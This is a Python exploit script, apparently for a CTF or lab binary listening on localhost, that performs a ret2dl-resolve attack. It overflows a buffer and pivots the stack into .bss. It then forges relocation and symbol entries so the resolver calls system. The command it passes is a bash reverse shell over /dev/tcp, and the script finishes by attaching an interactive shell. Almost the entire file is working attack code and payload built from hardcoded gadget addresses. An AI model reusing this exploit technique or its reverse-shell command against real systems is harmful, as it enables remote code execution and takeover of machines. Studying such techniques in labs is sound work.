import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

#shell(s)


addr_plt_read = 0x8048300

addr_bss = 0x804a020
addr_rel_plt = 0x80482b0
addr_plt = 0x80482f0
addr_plt_got = 0x8048330
addr_got_read = 0x804a00c
addr_dynsym = 0x80481cc
addr_dynstr = 0x804822c


pop3ret = 0x80484e9
popebpret = 0x080484eb
leaveret = 0x080483a8

host = '127.0.0.1'
port = 9999

#buf = ''
#buf += 'A' * 0x40
#f.write(buf + '\n')


# Connect

stack_size = 0x800
stack_pivot = addr_bss + stack_size
print 'addr_starget = {}'.format(hex(stack_pivot))

buf = ''
buf += 'A' * 0x28
buf += p(stack_pivot)
buf += p(addr_plt_read)
buf += p(leaveret)
buf += p(0)
buf += p(stack_pivot)
buf += p(0x100)

f.write(buf)


buf = ''
buf += p(stack_pivot)
buf += p(addr_plt)
buf += p((stack_pivot + 5 * 0x4) - addr_rel_plt) # Offset to fake rel
buf += p(0xdeadbeaf)
buf += p(stack_pivot + 12 * 0x4 + 3) # argument of system /bin/sh

# Rel
buf += p(addr_got_read)
buf += p((((stack_pivot + 9 * 0x4) - addr_dynsym) << 4) & ~0xff | 0x7) # rinfo

# Sym
buf += p((stack_pivot + 11 * 0x4) - addr_dynstr)
buf += p(0)
buf += p(0)
buf += p(0x12)
buf += 'system\x00'
#buf += '/bin/sh\x00'
buf += "bash -c 'bash -i>& /dev/tcp/{}/{} 0>&1'".format(host, port)


f.write(buf)

shell(s)
